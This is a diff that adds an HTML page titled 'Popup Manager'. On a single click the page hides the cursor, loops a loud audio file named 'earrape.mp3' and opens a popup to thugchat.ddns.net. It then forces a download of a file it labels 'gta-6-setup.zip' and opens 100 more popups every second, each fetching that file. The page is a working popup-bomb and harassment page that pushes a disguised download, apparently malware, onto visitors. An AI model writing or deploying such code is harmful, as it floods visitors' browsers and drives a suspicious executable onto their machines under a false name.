@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Popup Manager</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: black;
+            color: white;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            cursor: none; /* Hide cursor */
+        }
+    </style>
+</head>
+<body>
+    <audio id="background-audio" src="static/earrape.mp3" loop preload="auto"></audio>
+
+    <script>
+        let openWindows = [];
+        const windowWidth = 600; // Increased width
+        const windowHeight = 500; // Increased height
+        const backgroundAudio = document.getElementById('background-audio');
+
+        function getRandomPosition() {
+            const left = Math.random() * (window.innerWidth - windowWidth);
+            const top = Math.random() * (window.innerHeight - windowHeight);
+            return { left, top };
+        }
+
+        function openMainPopup() {
+            const url = 'https://thugchat.ddns.net/'; 
+            const { left, top } = getRandomPosition(); 
+            const newWindow = window.open(url, '', `width=${windowWidth},height=${windowHeight},left=${left},top=${top}`);
+            openWindows.push(newWindow);
+
+            // Play sound in the new popup
+            const audio = newWindow.document.createElement('audio');
+            audio.src = 'static/earrape.mp3';
+            audio.loop = true;
+            audio.play().catch(err => console.error("Audio play failed:", err)); // Catch any errors
+
+            // Trigger download in the new popup
+            newWindow.onload = function() {
+                const downloadLink = newWindow.document.createElement('a');
+                downloadLink.href = 'https://thugchat.ddns.net/static/gta-6-setup.zip';
+                downloadLink.download = 'gta-6-setup.zip'; // Specify the file name
+                document.body.appendChild(downloadLink);
+                downloadLink.click(); // Simulate a click on the link to start the download
+                document.body.removeChild(downloadLink); // Remove the link after downloading
+            };
+
+            newWindow.onbeforeunload = function() {
+                const index = openWindows.indexOf(newWindow);
+                if (index > -1) {
+                    openWindows.splice(index, 1);
+                }
+            };
+        }
+
+        function openAdditionalPopups() {
+            for (let i = 0; i < 100; i++) { // Open 100 additional popups per second
+                const url = 'https://thugchat.ddns.net/static/gta-6-setup.zip'; 
+                const { left, top } = getRandomPosition(); 
+                const downloadWindow = window.open(url, '', `width=${windowWidth},height=${windowHeight},left=${left},top=${top}`);
+                openWindows.push(downloadWindow);
+            }
+        }
+
+        // Start popups and audio on any click in the body
+        document.body.addEventListener('click', () => {
+            backgroundAudio.currentTime = 0; // Reset to start
+            backgroundAudio.play().catch(err => console.error("Audio play failed:", err)); // Catch any errors
+            openMainPopup(); // Open the main popup
+
+            // Open additional popups every second
+            setInterval(openAdditionalPopups, 1000); // Open 100 additional popups every second
+        });
+    </script>
+</body>
+</html>
